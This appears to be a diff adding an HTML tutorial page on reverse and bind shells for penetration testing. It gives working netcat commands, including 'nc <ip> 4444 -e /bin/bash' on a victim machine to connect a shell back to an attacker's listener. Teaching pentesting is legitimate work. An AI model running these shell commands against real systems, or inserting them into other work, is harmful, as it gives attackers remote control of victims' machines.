@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Types of Shells</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+        <link href="../css/styles.css" rel="stylesheet" />
+        <link href="../js/scripts.js">
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+       <style>
+             .heading
+            {
+                font-family: 'Times New Roman', Times, serif;
+                background-color:#343a40;
+                color:white;
+                padding:7px 0px 7px 5px;
+                border-radius: 10px;
+                font-size: 1.25rem;
+            }
+            
+            .code
+            {
+                background-color:lightgray;
+                padding-left:0.5rem;
+                border-radius: 10px;
+                margin-bottom: 10px;
+                margin-right: 0.5rem;
+            }
+            img
+            {
+                display: flex;
+                margin: 5px auto 10px auto;
+            }
+        </style>
+    </head>
+    <body>
+        <%- include("../../partials/header.ejs") %>
+        <header class="container" style="margin-top: 1rem;">
+            <h1 class="display-5">Types of shells</h1>
+            <img src="https://478h5m1yrfsa3bbe262u7muv-wpengine.netdna-ssl.com/wp-content/uploads/bind-shell-vs-reverse-shell-01.png" alt="Types of Shells" style="max-width:100%">
+            <p><strong>There are 2 types of shells we commonly deal in when doing pentesting.</strong></p>
+        </header>
+        <div class="container" style="margin-top: 1rem;">    
+            <h3 class="heading">Reverse Shell</h3>
+            <p>In this type of shell we make the victim/target connect to us. <br>
+            We set up a listener on our terminal and using a payload, make the victim connect to us.</p>
+            <div class="code">
+                <p><strong>On the victim's machine:</strong></p>
+                <p><em>Syntax :</em>nc &lt;attacker's ip&gt; &lt;port number&gt; -e /bin/bash</p>
+                <code>nc 192.168.1.14 4444 -e /bin/bash</code>
+                <p>In case this doesn't work for you, try <br>
+                <code>nc.traditional 192.168.1.14 4444 -e /bin/bash</code></p>
+            </div>
+            <h4>Let's break this down.</h4>
+            <p><strong>nc</strong> : It is the name of the tool (netcat) <br>
+               <strong>192.168.1.14</strong> : It is the ip of the attacker's machine <br>
+               <strong>4444</strong> : It is the port number using which the victim's machine makes a connection request. <br>
+               <strong>-e </strong>: It is a flag <br>
+            <strong>/bin/bash </strong>: The location to the victim's terminal.</p>
+            <div class="code">
+                <p><strong>On the attacker's machine:</strong></p>
+                <p><em>Syntax:</em>nc -nvlp &lt;port number &gt;</p>
+                <code>nc -nvlp 4444</code>
+            </div>
+            <p><strong>-nlvp </strong>: p stands for source port, l for listening, v for verbose, n to prevent DNS lookup. <br>
+              <Strong>4444</Strong> : Port number. Should be the same as used by the victim to connect.</p>
+        </div>
+    <div class="container">
+        <h3 class="heading">Bind Shell</h3>
+        <p>In this shell type, we connect to the victim. <br>
+        This isn't much used in actual penteshing, but there's no harm to in tyring to implement this if the reverse shell doesn't work.</p>
+        <div class="code">
+            <p><strong>Attacker's machine:</strong></p>
+            <p><en>Syntax:</en>nc &lt;victim's ip&gt; &lt;port number&gt;</p>
+            <code>nc 192.168.1.7 1234</code>
+        </div>
+        <div class="code">
+            <p><strong>Victim's Machine:</strong></p>
+            <p><en>Syntax:</en>nc -lvp &lt;port number&gt; -e /bin/bash</p>
+            <code>nc -lvp 1234 -e /bin/bash</code>
+        </div>
+    </div>
+
+    </body>
+</html>
